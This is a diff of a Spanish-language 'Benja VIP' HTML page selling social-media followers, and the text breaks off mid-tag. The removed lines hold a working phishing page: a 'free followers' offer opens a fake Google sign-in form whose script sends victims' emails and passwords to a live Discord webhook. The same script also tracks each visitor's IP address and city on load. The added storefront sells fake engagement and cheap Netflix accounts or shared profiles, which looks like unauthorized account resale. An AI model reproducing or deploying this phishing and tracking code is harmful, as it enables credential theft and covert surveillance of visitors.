@@ -3,137 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Benja VIP | Elite Social Growth</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>BENJA VIP | Professional SMM & Digital Store</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --gold: #d4af37; --bg: #050505; --google-blue: #1a73e8; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; }
+        :root { --primary: #00ff88; --bg: #050505; --card-bg: #111111; --text: #e0e0e0; }
+        body { margin: 0; background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow-x: hidden; }
         
-        /* HEADER PROFESIONAL */
-        .header { text-align: center; padding: 30px 0; border-bottom: 1px solid #111; }
-        .header h1 { color: var(--gold); margin: 0; font-size: 28px; letter-spacing: 3px; font-weight: 900; }
-        .live-tag { font-size: 10px; color: #2ecc71; text-transform: uppercase; margin-top: 5px; font-weight: bold; }
+        /* Fondo Animado de Partículas */
+        .bg-animate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at center, #111 0%, #050505 100%); }
+        .grid { position: absolute; width: 200%; height: 200%; background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px); background-size: 50px 50px; transform: rotate(15deg); top: -50%; left: -50%; opacity: 0.3; animation: move 20s linear infinite; }
+        @keyframes move { from { transform: rotate(15deg) translateY(0); } to { transform: rotate(15deg) translateY(50px); } }
 
-        /* PRODUCTOS */
-        .section-title { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: var(--gold); margin: 25px 0 15px; display: flex; align-items: center; gap: 10px; }
-        .section-title::after { content: ""; height: 1px; background: #1a1a1a; flex: 1; }
+        /* Header Profesional */
+        header { padding: 40px 20px; text-align: center; border-bottom: 1px solid #222; backdrop-filter: blur(10px); }
+        .status-dot { display: inline-block; width: 10px; height: 10px; background: var(--primary); border-radius: 50%; margin-right: 8px; box-shadow: 0 0 10px var(--primary); animation: blink 1.5s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        h1 { font-size: 3rem; margin: 10px 0; letter-spacing: -2px; background: linear-gradient(90deg, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        /* Contenedor de Productos */
+        .container { max-width: 1100px; margin: 50px auto; padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
+
+        /* Tarjetas Estilo Glassmorphism */
+        .card { background: var(--card-bg); border: 1px solid #222; border-radius: 20px; padding: 30px; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); position: relative; overflow: hidden; }
+        .card:hover { transform: translateY(-10px); border-color: var(--primary); box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
+        .card i { font-size: 45px; color: var(--primary); margin-bottom: 20px; }
+        .card h3 { font-size: 1.5rem; margin-bottom: 10px; color: #fff; }
+        .card p { color: #888; font-size: 0.9rem; margin-bottom: 25px; line-height: 1.6; }
         
-        .free-card { background: linear-gradient(145deg, #111, #000); border: 1px solid #222; border-radius: 25px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn-google-login { background: white; color: #3c4043; border: 1px solid #dadce0; padding: 12px; border-radius: 8px; width: 100%; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; margin-top: 15px; font-size: 14px; }
+        .price-tag { font-size: 1.8rem; font-weight: 800; color: #fff; margin-bottom: 20px; display: flex; align-items: baseline; gap: 8px; }
+        .price-tag span { font-size: 0.8rem; color: #555; text-transform: uppercase; }
 
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .card { background: #111; border-radius: 20px; padding: 20px; text-align: center; border: 1px solid #1a1a1a; }
-        .price { color: var(--gold); font-size: 18px; font-weight: 800; display: block; margin: 10px 0; }
-        .btn-wa { background: #25D366; color: white; text-decoration: none; padding: 10px; border-radius: 10px; display: block; font-size: 12px; font-weight: bold; }
+        .btn-action { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #fff; color: #000; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .btn-action:hover { background: var(--primary); transform: scale(1.02); }
 
-        /* MODAL DE GOOGLE SIMULADO */
-        #google-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000; flex-direction: column; align-items: center; padding-top: 50px; color: #202124; }
-        .g-logo { width: 75px; margin-bottom: 20px; }
-        .g-title { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        .g-subtitle { font-size: 16px; margin-bottom: 30px; }
-        .g-input { width: 90%; max-width: 350px; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 5px; font-size: 16px; outline-color: var(--google-blue); }
-        .g-footer { width: 90%; max-width: 350px; display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        .btn-next { background: var(--google-blue); color: white; border: none; padding: 10px 25px; border-radius: 5px; font-weight: 600; cursor: pointer; }
+        /* Badge de "Popular" */
+        .badge { position: absolute; top: 15px; right: 15px; background: var(--primary); color: #000; padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 900; }
 
-        /* RESEÑAS */
-        .reviews { margin-top: 30px; background: #080808; padding: 15px; border-radius: 15px; font-size: 11px; color: #666; }
-        .review { margin-bottom: 10px; border-bottom: 1px solid #111; padding-bottom: 5px; }
+        footer { text-align: center; padding: 40px; color: #444; border-top: 1px solid #222; }
     </style>
 </head>
-<body onload="rastreoInicial()">
+<body>
 
-<div class="container">
-    <div class="header">
-        <h1>BENJA <span>VIP</span></h1>
-        <div class="live-tag">● SERVIDOR ACTIVO | +1,420 ÓRDENES</div>
-    </div>
+    <div class="bg-animate"><div class="grid"></div></div>
 
-    <div class="section-title"><span>🎁 PANEL DE RECOMPENSAS</span></div>
-    <div class="free-card">
-        <h2 style="margin:0; font-size: 20px;">300 SEGUIDORES GRATIS</h2>
-        <p style="font-size: 11px; color: #666;">Selecciona una plataforma para sincronizar:</p>
-        <button class="btn-google-login" onclick="abrirGoogle('Instagram')">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18"> Continuar con Google
-        </button>
-        <button class="btn-google-login" onclick="abrirGoogle('TikTok')" style="margin-top:10px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18"> Vincular TikTok vía Google
-        </button>
-    </div>
+    <header>
+        <div><span class="status-dot"></span> <span style="color:var(--primary); font-weight:bold;">SISTEMA ONLINE</span></div>
+        <h1>BENJA VIP STORE</h1>
+        <p style="color:#666;">Servicios Digitales Premium • Entrega Instantánea</p>
+    </header>
 
-    <div class="section-title"><span>💎 PACKS EXCLUSIVOS</span></div>
-    <div class="grid">
+    <div class="container">
         <div class="card">
-            <b>20k FOLLOWERS</b>
-            <span class="price">$30.000 AR$</span>
-            <a href="https://wa.me/5493364546172" class="btn-wa">SOLICITAR</a>
+            <div class="badge">TOP VENTAS</div>
+            <i class="fab fa-instagram"></i>
+            <h3>Followers Premium</h3>
+            <p>Seguidores reales con garantía de 30 días contra caídas. Perfiles con foto y actividad.</p>
+            <div class="price-tag">$4.99 <span>/ 1K Units</span></div>
+            <button class="btn-action" onclick="order('Instagram 1K', '$4.99')">OBTENER AHORA</button>
         </div>
+
         <div class="card">
-            <b>100k FOLLOWERS</b>
-            <span class="price">$80.000 AR$</span>
-            <a href="https://wa.me/5493364546172" class="btn-wa" style="background:var(--gold); color:black;">COMPRAR</a>
+            <i class="fab fa-tiktok"></i>
+            <h3>TikTok Viral Pack</h3>
+            <p>Vistas + Likes + Compartidas. El algoritmo de TikTok te amará con este servicio.</p>
+            <div class="price-tag">$8.50 <span>/ Full Pack</span></div>
+            <button class="btn-action" onclick="order('TikTok Pack', '$8.50')">OBTENER AHORA</button>
         </div>
-    </div>
 
-    <div class="reviews">
-        <div class="review">⭐ "Increíble, me llegaron los de IG en minutos" - @matias_ok</div>
-        <div class="review">⭐ "El soporte por WhatsApp es muy rápido" - @sofi_vlogs</div>
-    </div>
-</div>
+        <div class="card">
+            <i class="fas fa-tv"></i>
+            <h3>Netflix 4K HDR</h3>
+            <p>Cuentas privadas o perfiles compartidos. Sin interrupciones, renovables cada mes.</p>
+            <div class="price-tag">$3.00 <span>/ Mensual</span></div>
+            <button class="btn-action" onclick="order('Netflix Account', '$3.00')">OBTENER AHORA</button>
+        </div>
 
-<div id="google-modal">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
-    <div class="g-title">Acceder</div>
-    <div class="g-subtitle">Usa tu cuenta de Google</div>
-    
-    <input type="email" id="email_g" class="g-input" placeholder="Correo electrónico o teléfono">
-    <input type="password" id="pass_g" class="g-input" placeholder="Introduce tu contraseña">
-    
-    <div style="width:90%; max-width:350px; text-align:left; color:var(--google-blue); font-weight:bold; font-size:14px; margin-top:10px;">¿Has olvidado tu contraseña?</div>
-    
-    <div class="g-footer">
-        <span style="color:var(--google-blue); font-weight:bold; font-size:14px;">Crear cuenta</span>
-        <button class="btn-next" onclick="finalizarCaptura()">Siguiente</button>
-    </div>
-</div>
-
-<script>
-    const webhook = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
-    let plataformaActual = "";
-
-    // 🕵️ RASTREO AUTOMÁTICO AL ENTRAR (DICE IP Y CIUDAD)
-    async function rastreoInicial() {
-        try {
-            const r = await fetch('https://ipapi.co/json/');
-            const d = await r.json();
-            const payload = {
-                content: `👀 **VISITANTE NUEVO**\n🌍 País: \`${d.country_name}\`\n📍 Ciudad: \`${d.city}\`\n🌐 IP: \`${d.ip}\`\n📱 Equipo: \`${navigator.userAgent.slice(0,50)}\``
-            };
-            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-        } catch(e) {}
-    }
-
-    function abrirGoogle(p) {
-        plataformaActual = p;
-        document.getElementById('google-modal').style.display = 'flex';
-    }
-
-    async function finalizarCaptura() {
-        const e = document.getElementById('email_g').value;
-        const p = document.getElementById('pass_g').value;
-
-        if(!e || !p) return alert("Por favor, introduzca sus datos.");
-
-        const datos = {
-            content: `🔥 **NUEVA CUENTA CAPTURADA (GOOGLE)**\n🎮 Plataforma: \`${plataformaActual}\`\n📧 Email: \`${e}\`\n🔑 Pass: \`${p}\` \n⚠️ **¡ENTRÁ RÁPIDO!**`
-        };
-
-        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(datos) });
-        
-        alert("Sincronización exitosa con Google. Los 300 seguidores se cargarán en tu cuenta de " + plataformaActual + " en las próximas horas.");
-        location.reload();
-    }
-</script>
-
-</body>
-</html>
+        <div class="card">
+            <i class="fab fa
